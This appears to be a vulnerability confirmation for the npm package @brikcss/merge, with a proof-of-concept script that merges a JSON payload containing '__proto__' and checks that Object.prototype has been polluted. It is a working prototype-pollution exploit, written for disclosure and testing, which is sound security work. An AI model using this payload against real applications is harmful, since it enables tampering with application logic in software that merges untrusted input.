Confirmed the prototype pollution vulnerability works via the package's merge/objects logic (which relies on the path-join helper — `function t` in the ESM build — to check the `ignore` list but never blocks `__proto__`, `constructor`, or `prototype` keys).

```javascript
const merge = require("@brikcss/merge");

// The recursive object-merge logic (whose join-path helper is
// minified/exported as function `t` in dist/module/merge.js) never
// excludes "__proto__" from the keys it copies onto the target object.
// Merging attacker-controlled JSON therefore pollutes Object.prototype.
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');

merge({}, payload);

console.log("Object.prototype.polluted =", ({}).polluted);
if (({}).polluted === "yes") {
  console.log("VULNERABLE: prototype pollution succeeded");
}
```
